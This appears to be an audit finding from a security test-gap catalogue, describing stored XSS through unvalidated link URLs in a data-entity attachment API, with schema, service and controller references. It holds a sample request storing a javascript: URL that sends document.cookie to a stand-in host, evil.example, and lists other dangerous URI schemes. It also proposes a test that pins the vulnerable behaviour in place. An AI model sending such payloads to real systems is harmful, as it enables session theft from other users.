behaviour: |-
  **HIGH — `saveLinks` / `updateLink` accept link URLs verbatim with NO scheme allowlist, NO `@URL` constraint, NO length cap. A link with `javascript:` scheme is STORED and RENDERED by the UI — F-004 family stored-XSS on the dedicated DataEntity-link surface (NOT the description surface).** Primary-source confirmed in the batch-V DataEntityAttachmentController sidecar:

  - **Schema tier — no constraint**: `components.yaml:2482-2491` declares `DataEntityLinkFormData` with `url: type: string` — NO `format`, NO `pattern`, NO `maxLength`. OpenAPI 3.0 `format: uri` is NOT applied (would only enforce well-formed URI syntax, but Spring does not validate URI scheme even with that format).
  - **Service tier — pass-through**: `LinkServiceImpl.java:31-37` (`bulkCreate`) stores `formData.items` directly via the MapStruct mapper — no validation step. `LinkServiceImpl.java:41-46` (`update`) applies `formData` to the existing pojo directly.
  - **Controller tier — pass-through**: `DataEntityAttachmentController.java:91-114` — saveLinks (POST), updateLink (PUT), deleteLink (DELETE) — all are 1-line `attachmentService.X(...)` delegations with no validation.
  - **UI tier — render contract**: per the DataEntityAttachmentController sidecar `bugs_limitations_corner_cases.[7]`, "A link with javascript: scheme is stored and rendered by the UI" — the UI's link-render path is the operative defence-in-depth, BUT the UI default behaviour is to render the URL as `<a href={url}>` which executes `javascript:` schemes on click.

  **Attack scenario**:
  ```
  POST /api/dataentities/100/links
  {
    "items": [
      {
        "url": "javascript:fetch('https://evil.example/exfil?cookie='+document.cookie)",
        "description": "Important runbook"
      }
    ]
  }
  ```
  Any subsequent authenticated user viewing the data entity's attachments tab who CLICKS the "Important runbook" link executes the `javascript:` URL in the platform's origin. The blast radius is the entire authenticated-user pool (read-collaborative posture means every authenticated user can READ every data entity's attachments per TEST-GAP-028 / TEST-GAP-740).

  **Related URI schemes**:
  - `javascript:` — direct script execution
  - `data:text/html,<script>...` — script execution via data-URI
  - `vbscript:` — IE-only but still rendered in some embedded webviews
  - `file://` — local file access (some browsers honour, exposing local file content)
  - `intent://` — Android-specific intent invocation

  **Compound with TEST-GAP-022 + TEST-GAP-027 + TEST-GAP-028 + TEST-GAP-731 + TEST-GAP-735 + TEST-GAP-740**: the link URL is now THE SEVENTH distinct attachment-subsystem security gap. The cumulative finding: the entire attachment subsystem has compound security weakness across (a) upload state-machine hijack, (b) header injection, (c) read-without-permission, (d) cross-entity URL spoofing, (e) filename path-traversal, (f) link-URL-scheme bypass — six independent surfaces in one controller. The aggregate severity at the SUBSYSTEM level is CRITICAL; the individual surface is HIGH.

  **Why HIGH not CRITICAL**: each individual attack requires a user-click action (the link must be clicked to fire the `javascript:` payload). The compound with the read-collaborative cross-entity exposure means the SAME payload reaches every authenticated user's attachment-tab on the target entity, but click-to-execute remains required. HIGH for the per-instance severity.

  **Test gap shape**: regression-pin asserting the verbatim-storage contract for link URLs with `javascript:`, `data:`, and `vbscript:` schemes. Pin the current behaviour so a future maintainer adding a scheme allowlist breaks the test in lockstep.
